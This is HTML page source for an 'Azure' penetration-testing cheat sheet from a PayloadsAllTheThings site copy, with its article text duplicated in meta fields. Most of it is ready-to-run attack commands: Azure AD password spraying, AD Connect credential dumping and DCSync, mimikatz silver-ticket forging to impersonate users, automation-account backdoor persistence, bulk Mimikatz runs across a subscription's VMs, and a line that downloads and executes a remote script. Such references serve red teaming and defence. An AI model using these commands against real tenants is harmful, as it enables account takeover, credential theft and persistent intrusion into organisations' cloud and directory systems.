script to get array of users / roles $roleUsers = @() $roles=Get-AzureADDirectoryRole ForEach($role in $roles) { $users=Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId ForEach($user in $users) { write-host $role.DisplayName,$user.DisplayName $obj = New-Object PSCustomObject $obj | Add-Member -type NoteProperty -name RoleName -value &quot;&quot; $obj | Add-Member -type NoteProperty -name UserDisplayName -value &quot;&quot; $obj | Add-Member -type NoteProperty -name IsAdSynced -value false $obj.RoleName=$role.DisplayName $obj.UserDisplayName=$user.DisplayName $obj.IsAdSynced=$user.DirSyncEnabled -eq $true $roleUsers+=$obj } } $roleUsers ### Enumeration using Microburst git clone https://github.com/NetSPI/MicroBurst/blob/master/Get-AzureADDomainInfo.ps1 Import-Module .\MicroBurst.psm1 # Anonymous enumeration Invoke-EnumerateAzureBlobs -Base company Invoke-EnumerateAzureSubDomains -base company -verbose # Authencticated enumeration Get-AzureADDomainInfo Get-AzureDomainInfo -folder MicroBurst -VerboseGet-MSOLDomainInfo Get-MSOLDomainInfo With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD. Authenticate to your webmail portal (i.e. https://webmail.domain.com/) Change your browser URL to: https://azure.microsoft.com/ Pick the account from the active sessions Select Azure Active Directory and enjoy! Azure AD - Password Spray Default lockout policy of 10 failed attempts, locking out an account for 60 seconds 1 2 3 4 5 6 7 8 9 10 git clone https://github.com/dafthack/MSOLSpray Import-Module .\MSOLSpray.ps1 Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020 Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme! # UserList - UserList file filled with usernames one-per-line in the format &quot;user@domain.com&quot; # Password - A single password that will be used to perform the password spray. # OutFile - A file to output valid results to. # Force - Forces the spray to continue and not stop when multiple account lockouts are detected. # URL - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from. Azure AD - Convert GUID to SID The user’s AAD id is translated to SID by concatenating &quot;S-1–12–1-&quot; to the decimal representation of each section of the AAD Id. 1 2 GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)] SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)] For example, the representation of 6aa89ecb-1f8f-4d92–810d-b0dce30b6c82 is S-1–12–1–1789435595–1301421967–3702525313–2188119011 Azure AD - Sign in with a service principal https://docs.microsoft.com/en-us/powershell/azure/authenticate-azureps?view=azps-3.3.0&amp;viewFallbackFrom=azurermps-6.5.0#sign-in-with-a-service-principal :warning: Service Principal accounts do not require MFA. Anyone with control over Service Principals can assign credentials to them and potentially escalate privileges. Password based authentication 1 2 3 # Use the service principal ID for the username $pscredential = Get-Credential Connect-AzAccount -ServicePrincipal -Credential $pscredential -Tenant $tenantId Certificate based authentication 1 Connect-AzAccount -ApplicationId $appId -Tenant $tenantId -CertificateThumbprint &lt;thumbprint&gt; Azure AD Connect - Password extraction Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf Tool Requires code execution on target DLL dependencies Requires MSSQL locally Requires python locally ADSyncDecrypt Yes Yes No No ADSyncGather Yes No No Yes ADSyncQuery No (network RPC calls only) No Yes Yes 1 2 git clone https://github.com/fox-it/adconnectdump # DCSync with AD Sync account Azure AD Connect - MSOL Account’s password and DCSync You can perform DCSync attack using the MSOL account. Prerequisite: Compromise a server with Azure AD Connect service Access to ADSyncAdmins or local Administrators groups Use the script azuread_decrypt_msol.ps1 from @xpn to recover the decrypted password for the MSOL account: azuread_decrypt_msol.ps1: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545 azuread_decrypt_msol_v2.ps1: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack. Azure AD Connect - Seamless Single Sign On Silver Ticket Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA) :warning: The password of the AZUREADSSOACC account never changes. Using https://autologon.microsoftazuread-sso.com/ to convert Kerberos tickets to SAML and JWT for Office 365 &amp; Azure NTLM password hash of the AZUREADSSOACC account, e.g. f9969e088b2c13d93833d0ce436c76dd. 1 mimikatz.exe &quot;lsadump::dcsync /user:AZUREADSSOACC$&quot; exit AAD logon name of the user we want to impersonate, e.g. elrond@contoso.com. This is typically either his userPrincipalName or mail attribute from the on-prem AD. SID of the user we want to impersonate, e.g. S-1-5-21-2121516926-2695913149-3163778339-1234. Create the Silver Ticket and inject it into Kerberos cache: 1 2 3 4 mimikatz.exe &quot;kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt&quot; exit Launch Mozilla Firefox Go to about:config and set the network.negotiate-auth.trusted-uris preference to value https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty. Azure AD - ADFS Federation Server ~Cloud Kerberos Discover Federation Servers adfs auth fs okta ping sso sts OWA Version Discovery : autodiscover.domain.com Azure AD - Persistence via Automation accounts Create a new Automation Account “Create Azure Run As account”: Yes Import a new runbook that creates an AzureAD user with Owner permissions for the subscription* Sample runbook for this Blog located here – https://github.com/NetSPI/MicroBurst Publish the runbook Add a webhook to the runbook Add the AzureAD module to the Automation account Update the Azure Automation Modules Assign “User Administrator” and “Subscription Owner” rights to the automation account Eventually lose your access… Trigger the webhook with a post request to create the new user 1 2 3 4 $uri = &quot;https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d&quot; $AccountInfo = @(@{RequestBody=@{Username=&quot;BlogDemoUser&quot;;Password=&quot;Password123&quot;}}) $body = ConvertTo-Json -InputObject $AccountInfo $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body Azure VM - Execute command as NT SYSTEM with Contributor right Allow anyone with “Contributor” rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\System 1 2 3 4 5 6 PS C:\&gt; Get-AzureRmVM -status | where {$_.PowerState -EQ &quot;VM running&quot;} | select ResourceGroupName,Name ResourceGroupName Name ----------------- ---- TESTRESOURCES Remote-Test PS C:\&gt; Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1 Against the whole subscription using MicroBurst.ps1 1 2 Import-module MicroBurst.psm1 Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt Office365 - Enumerating Users NOTE: By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute. Bruteforce user enum : https://bitbucket.org/grimhacker/office365userenum/src/master/ based on the endpoint https://login.microsoftonline.com/getuserrealm.srf?login=firstname.lastname@domain.com&amp;xml=1 1 2 3 4 5 6 7 8 9 10 RealmInfo Success=&quot;true&quot;&gt; &lt;State&gt;3&lt;/State&gt; &lt;UserState&gt;2&lt;/UserState&gt; &lt;Login&gt;firstname.lastname@domain.com&lt;/Login&gt; &lt;NameSpaceType&gt;Federated&lt;/NameSpaceType&gt; &lt;DomainName&gt;domain.com&lt;/DomainName&gt; &lt;FederationGlobalVersion&gt;-1&lt;/FederationGlobalVersion&gt; &lt;AuthURL&gt; https://fws.domain.com/o365/visfed/intrdomain/se/?username=firstname.lastname%40domain.com&amp;wa=wsignin1.0&amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;wctx= &lt;/AuthURL&gt; Validate email : https://github.com/LMGsec/o365creeper o365creeper.py -f emails.txt -o validemails.txt Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon References An introduction to penetration testing Azure - Graceful Security Running Powershell scripts on Azure VM - Netspi Attacking Azure Cloud shell - Netspi Maintaining Azure Persistence via automation accounts - Netspi Detecting an attacks on active directory with Azure - Smartspate Azure AD Overview Windows Azure Active Directory in plain English Building Free Active Directory Lab in Azure - @kamran.bilgrami Attacking Azure/Azure AD and introducing Powerzure - SpecterOps Azure AD connect for RedTeam - @xpnsec Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020 Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020 Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020 AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20 Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter" />
<link rel="canonical" href="http://localhost:4000/Cloud-Azure-Pentest/" />
<meta property="og:url" content="http://localhost:4000/Cloud-Azure-Pentest/" />
<meta property="og:site_name" content="PayloadsAllTheThings" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-05-16T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Azure" />
<meta name="twitter:site" content="@Zxce3_" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Azure","dateModified":"2020-05-16T00:00:00+07:00","datePublished":"2020-05-16T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Cloud-Azure-Pentest/"},"url":"http://localhost:4000/Cloud-Azure-Pentest/","description":"Summary Tools Azure Architecture Azure Storage Account - Access Azure AD vs Active Directory Azure AD - Enumeration Azure AD - Password Spray Azure AD - Convert GUID to SID Azure AD - Sign in with a service principal Azure AD Connect - Password extraction Azure AD Connect - MSOL Account’s password and DCSync Azure AD Connect - Seamless Single Sign On Silver Ticket Azure AD - ADFS Federation Server ~Cloud Kerberos Azure AD - Persistence via Automation accounts Azure VM - Execute command as NT SYSTEM with Contributor right Office365 - Enumerating Users References Tools :warning: 16 apr 2019 : BloodHound does not support any analysis with AzureAD. :warning: Tokens for Azure are cached in C:\\Users\\[Name]\\.Azure\\accessTokens.json PowerZure - 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 require az module ! $ git clone https://github.com/hausec/PowerZure $ ipmo .\\PowerZure $ Set-Subscription -Id [idgoeshere] # Reader $ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails # Contributor $ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command &quot;whoami&quot; $ Execute-MSBuild -VM Win10Test -ResourceGroup Test-RG -File &quot;build.xml&quot; $ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents $ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine&#39;s disk # Owner $ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest # Administrator $ Create-Backdoor, Execute-Backdoor Azure CLI - Default azure CLI 1 2 3 4 5 6 $ AZ_REPO=$(lsb_release -cs) echo &quot;deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ $AZ_REPO main&quot; | sudo tee /etc/apt/sources.list.d/azure-cli.list $ curl -L https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - $ sudo apt-get install apt-transport-https $ sudo apt-get update &amp;&amp; sudo apt-get install azure-cli # dump users $ az ad user list --output=table --query=&#39;[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}&#39; MicroBurst - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping 1 2 3 4 $ git clone https://github.com/NetSPI/MicroBurst PS C:&gt; Import-Module .\\MicroBurst.psm1 PS C:&gt; Import-Module .\\Get-AzureDomainInfo.ps1 PS C:&gt; Get-AzureDomainInfo -folder MicroBurst -Verbose SkyArk - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins. Require: Read-Only permissions over Azure Directory (Tenant) Read-Only permissions over Subscription Require AZ and AzureAD module or administrator right 1 2 3 4 5 6 7 8 9 $ git clone https://github.com/cyberark/SkyArk $ powershell -ExecutionPolicy Bypass -NoProfile PS C&gt; Import-Module .\\SkyArk.ps1 -force PS C&gt; Start-AzureStealth or in the Cloud Console PS C&gt; IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1&#39;) PS C&gt; Scan-AzureAdmins Azurite Explorer and Azurite Visualizer : Enumeration and reconnaissance activities in the Microsoft Azure Cloud. 1 2 3 4 5 6 7 8 git clone https://github.com/mwrlabs/Azurite.git git clone https://github.com/FSecureLABS/Azurite git submodule init git submodule update PS&gt; Import-Module AzureRM PS&gt; Import-Module AzuriteExplorer.ps1 PS&gt; Review-AzureRmSubscription PS&gt; Review-CustomAzureRmSubscription Azucar : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks. 1 2 3 4 5 6 7 8 9 10 # You should use an account with at least read-permission on the assets you want to access git clone https://github.com/nccgroup/azucar.git PS&gt; Get-ChildItem -Recurse c:\\Azucar_V10 | Unblock-File PS&gt; .\\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT PS&gt; .\\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\\AzucarTest\\server.pfx -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 PS&gt; .\\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\\AzucarTest\\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 # resolve the TenantID for an specific username PS&gt; .\\Azucar.ps1 -ResolveTenantUserName user@company.com Azure Architecture Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&amp;name=large Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&amp;name=large Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&amp;name=large Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&amp;name=large Azure Storage Account - Access Blobs – *.blob.core.windows.net 1 $ AzCopy /Source:https://myaccount.blob.core.windows.net/mycontainer /Dest:C:\\myfolder /SourceKey:key /S File Services – *.file.core.windows.net Data Tables – *.table.core.windows.net Queues – *.queue.core.windows.net z ```powershell https://github.com/NetSPI/MicroBurst S C:&gt; Invoke-EnumerateAzureBlobs -Base secure [-BingAPIKey 12345678901234567899876543210123] Found Storage Account - secure.blob.core.windows.net Found Storage Account - testsecure.blob.core.windows.net Found Storage Account - securetest.blob.core.windows.net Found Storage Account - securedata.blob.core.windows.net Found Storage Account - securefiles.blob.core.windows.net Found Storage Account - securefilestorage.blob.core.windows.net Found Storage Account - securestorageaccount.blob.core.windows.net Found Storage Account - securesql.blob.core.windows.net Found Storage Account - hrsecure.blob.core.windows.net Found Storage Account - secureit.blob.core.windows.net Found Storage Account - secureimages.blob.core.windows.net Found Storage Account - securestorage.blob.core.windows.net Bing Found Storage Account - notrealstorage.blob.core.windows.net Found Container - hrsecure.blob.core.windows.net/NETSPItest 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ## Azure AD vs Active Directory | Active Directory | Azure AD | |---|---| | LDAP | REST API&#39;S | | NTLM/Kerberos | OAuth/SAML/OpenID | | Structured directory (OU tree) | Flat structure | | GPO | No GPO&#39;s | | Super fine-tuned access controls | Predefined roles | | Domain/forest | Tenant | | Trusts | Guests | * Password Hash Syncronization (PHS) * Passwords from on-premise AD are sent to the cloud * Use replication via a service account created by AD Connect * Pass Through Authentication (PTA) * Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text * Connect Windows Server AD to Azure AD using Federation Server (ADFS) * Dir-Sync : Handled by on-premise Windows Server AD, sync username/password ## Azure AD - Enumeration &gt; By default it is possible to query almost all the information about the directory as authenticated user, even when the Azure portal is restricted, using Azure AD Graph. Check if the compagny is using Azure AD with `https://login.microsoftonline.com/getuserrealm.srf?login=username@target.onmicrosoft.com&amp;xml=1`. ```powershell $ git clone https://github.com/dirkjanm/ROADtools $ pip install roadrecon $ roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout] $ roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa] $ roadrecon dump $ roadrecon gui Can be used in BloodHound using the fork : https://github.com/dirkjanm/BloodHound-AzureAD 1 2 3 4 5 6 7 8 9 10 11 12 PS C:\\&gt; git clone https://github.com/adrecon/AzureADRecon.git PS C:\\&gt; Install-Module -Name AzureAD PS C:\\&gt; .\\AzureADRecon.ps1 or PS C:\\&gt; $username = &quot;username@fqdn&quot; PS C:\\&gt; $passwd = ConvertTo-SecureString &quot;PlainTextPassword&quot; -AsPlainText -Force PS C:\\&gt; $creds = New-Object System.Management.Automation.PSCredential ($username, $passwd) PS C:\\&gt; .\\AzureADRecon.ps1 -Credential $creds PS C:\\&gt;.\\AzureADRecon.ps1 -GenExcel C:\\AzureADRecon-Report-&lt;timestamp&gt; Stormspotter, graphing Azure and Azure Active Directory objects 1 2 3 4 5 6 7 $ docker run --name stormspotter -p7474:7474 -p7687:7687 -d --env NEO4J_AUTH=neo4j/[password] neo4j:3.5.18 git clone https://github.com/Azure/Stormspotter cd Stormspotter pipenv install . stormspotter --cli stormdash -dbu &lt;neo4j-user&gt; -dbp &lt;neo4j-pass&gt; Browse to http://127.0.0.1:8050 to interact with the graph. Other interesting commands to enumerate Azure AD. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 # Azure AD powershell module Get-AzureADDirectoryRole # MSOnline powershell module Get-MsolRole Get-MsolRoleMember -RoleObjectId XXXXXXXXXX-XXXX-XXXX... | fl #Connect to Azure AD using Powershell install-module azuread import-module azuread get-module azuread connect-azuread # Get list of users with role global admins# Note that role =! group $role = Get-AzureADDirectoryRole | Where-Object {$_.displayName -eq &#39;Company Administrator&#39;} Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId # Get all groups and an example using filter Get-AzureADGroup Get-AzureADGroup -Filter &quot;DisplayName eq &#39;Intune Administrators&#39;&quot; # Get Azure AD policy Get-AzureADPolicy # Get Azure AD roles with some examples Get-AzureADDirectoryRole Get-AzureADDirectoryRole | Where-Object {$_.displayName -eq &#39;Security Reader&#39;} Get-AzureADDirectoryRoleTemplate # Get Azure AD SPNs Get-AzureADServicePrincipal # Log in using Azure CLI (this is not powershell) az login --allow-no-subscriptions # Get member list using Azure CLI az ad group member list --output=json --query=&#39;[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}&#39; --group=&#39;Company Administrators&#39; # Get user list az ad user list --output=json --query=&#39;[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}&#39; --upn=&#39;username@domain.com&#39; #PS script to get array of users / roles $roleUsers = @() $roles=Get-AzureADDirectoryRole ForEach($role in $roles) { $users=Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId ForEach($user in $users) { write-host $role.DisplayName,$user.DisplayName $obj = New-Object PSCustomObject $obj | Add-Member -type NoteProperty -name RoleName -value &quot;&quot; $obj | Add-Member -type NoteProperty -name UserDisplayName -value &quot;&quot; $obj | Add-Member -type NoteProperty -name IsAdSynced -value false $obj.RoleName=$role.DisplayName $obj.UserDisplayName=$user.DisplayName $obj.IsAdSynced=$user.DirSyncEnabled -eq $true $roleUsers+=$obj } } $roleUsers ### Enumeration using Microburst git clone https://github.com/NetSPI/MicroBurst/blob/master/Get-AzureADDomainInfo.ps1 Import-Module .\\MicroBurst.psm1 # Anonymous enumeration Invoke-EnumerateAzureBlobs -Base company Invoke-EnumerateAzureSubDomains -base company -verbose # Authencticated enumeration Get-AzureADDomainInfo Get-AzureDomainInfo -folder MicroBurst -VerboseGet-MSOLDomainInfo Get-MSOLDomainInfo With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD. Authenticate to your webmail portal (i.e. https://webmail.domain.com/) Change your browser URL to: https://azure.microsoft.com/ Pick the account from the active sessions Select Azure Active Directory and enjoy! Azure AD - Password Spray Default lockout policy of 10 failed attempts, locking out an account for 60 seconds 1 2 3 4 5 6 7 8 9 10 git clone https://github.com/dafthack/MSOLSpray Import-Module .\\MSOLSpray.ps1 Invoke-MSOLSpray -UserList .\\userlist.txt -Password Winter2020 Invoke-MSOLSpray -UserList .\\users.txt -Password d0ntSprayme! # UserList - UserList file filled with usernames one-per-line in the format &quot;user@domain.com&quot; # Password - A single password that will be used to perform the password spray. # OutFile - A file to output valid results to. # Force - Forces the spray to continue and not stop when multiple account lockouts are detected. # URL - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from. Azure AD - Convert GUID to SID The user’s AAD id is translated to SID by concatenating &quot;S-1–12–1-&quot; to the decimal representation of each section of the AAD Id. 1 2 GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)] SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)] For example, the representation of 6aa89ecb-1f8f-4d92–810d-b0dce30b6c82 is S-1–12–1–1789435595–1301421967–3702525313–2188119011 Azure AD - Sign in with a service principal https://docs.microsoft.com/en-us/powershell/azure/authenticate-azureps?view=azps-3.3.0&amp;viewFallbackFrom=azurermps-6.5.0#sign-in-with-a-service-principal :warning: Service Principal accounts do not require MFA. Anyone with control over Service Principals can assign credentials to them and potentially escalate privileges. Password based authentication 1 2 3 # Use the service principal ID for the username $pscredential = Get-Credential Connect-AzAccount -ServicePrincipal -Credential $pscredential -Tenant $tenantId Certificate based authentication 1 Connect-AzAccount -ApplicationId $appId -Tenant $tenantId -CertificateThumbprint &lt;thumbprint&gt; Azure AD Connect - Password extraction Credentials in AD Sync : C:\\Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf Tool Requires code execution on target DLL dependencies Requires MSSQL locally Requires python locally ADSyncDecrypt Yes Yes No No ADSyncGather Yes No No Yes ADSyncQuery No (network RPC calls only) No Yes Yes 1 2 git clone https://github.com/fox-it/adconnectdump # DCSync with AD Sync account Azure AD Connect - MSOL Account’s password and DCSync You can perform DCSync attack using the MSOL account. Prerequisite: Compromise a server with Azure AD Connect service Access to ADSyncAdmins or local Administrators groups Use the script azuread_decrypt_msol.ps1 from @xpn to recover the decrypted password for the MSOL account: azuread_decrypt_msol.ps1: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545 azuread_decrypt_msol_v2.ps1: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack. Azure AD Connect - Seamless Single Sign On Silver Ticket Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA) :warning: The password of the AZUREADSSOACC account never changes. Using https://autologon.microsoftazuread-sso.com/ to convert Kerberos tickets to SAML and JWT for Office 365 &amp; Azure NTLM password hash of the AZUREADSSOACC account, e.g. f9969e088b2c13d93833d0ce436c76dd. 1 mimikatz.exe &quot;lsadump::dcsync /user:AZUREADSSOACC$&quot; exit AAD logon name of the user we want to impersonate, e.g. elrond@contoso.com. This is typically either his userPrincipalName or mail attribute from the on-prem AD. SID of the user we want to impersonate, e.g. S-1-5-21-2121516926-2695913149-3163778339-1234. Create the Silver Ticket and inject it into Kerberos cache: 1 2 3 4 mimikatz.exe &quot;kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt&quot; exit Launch Mozilla Firefox Go to about:config and set the network.negotiate-auth.trusted-uris preference to value https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty. Azure AD - ADFS Federation Server ~Cloud Kerberos Discover Federation Servers adfs auth fs okta ping sso sts OWA Version Discovery : autodiscover.domain.com Azure AD - Persistence via Automation accounts Create a new Automation Account “Create Azure Run As account”: Yes Import a new runbook that creates an AzureAD user with Owner permissions for the subscription* Sample runbook for this Blog located here – https://github.com/NetSPI/MicroBurst Publish the runbook Add a webhook to the runbook Add the AzureAD module to the Automation account Update the Azure Automation Modules Assign “User Administrator” and “Subscription Owner” rights to the automation account Eventually lose your access… Trigger the webhook with a post request to create the new user 1 2 3 4 $uri = &quot;https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d&quot; $AccountInfo = @(@{RequestBody=@{Username=&quot;BlogDemoUser&quot;;Password=&quot;Password123&quot;}}) $body = ConvertTo-Json -InputObject $AccountInfo $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body Azure VM - Execute command as NT SYSTEM with Contributor right Allow anyone with “Contributor” rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\\System 1 2 3 4 5 6 PS C:\\&gt; Get-AzureRmVM -status | where {$_.PowerState -EQ &quot;VM running&quot;} | select ResourceGroupName,Name ResourceGroupName Name ----------------- ---- TESTRESOURCES Remote-Test PS C:\\&gt; Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1 Against the whole subscription using MicroBurst.ps1 1 2 Import-module MicroBurst.psm1 Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt Office365 - Enumerating Users NOTE: By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute. Bruteforce user enum : https://bitbucket.org/grimhacker/office365userenum/src/master/ based on the endpoint https://login.microsoftonline.com/getuserrealm.srf?login=firstname.lastname@domain.com&amp;xml=1 1 2 3 4 5 6 7 8 9 10 RealmInfo Success=&quot;true&quot;&gt; &lt;State&gt;3&lt;/State&gt; &lt;UserState&gt;2&lt;/UserState&gt; &lt;Login&gt;firstname.lastname@domain.com&lt;/Login&gt; &lt;NameSpaceType&gt;Federated&lt;/NameSpaceType&gt; &lt;DomainName&gt;domain.com&lt;/DomainName&gt; &lt;FederationGlobalVersion&gt;-1&lt;/FederationGlobalVersion&gt; &lt;AuthURL&gt; https://fws.domain.com/o365/visfed/intrdomain/se/?username=firstname.lastname%40domain.com&amp;wa=wsignin1.0&amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;wctx= &lt;/AuthURL&gt; Validate email : https://github.com/LMGsec/o365creeper o365creeper.py -f emails.txt -o validemails.txt Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon References An introduction to penetration testing Azure - Graceful Security Running Powershell scripts on Azure VM - Netspi Attacking Azure Cloud shell - Netspi Maintaining Azure Persistence via automation accounts - Netspi Detecting an attacks on active directory with Azure - Smartspate Azure AD Overview Windows Azure Active Directory in plain English Building Free Active Directory Lab in Azure - @kamran.bilgrami Attacking Azure/Azure AD and introducing Powerzure - SpecterOps Azure AD connect for RedTeam - @xpnsec Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020 Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020 Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020 AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20 Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Azure | PayloadsAllTheThings
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="PayloadsAllTheThings">
<meta name="application-name" content="PayloadsAllTheThings">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

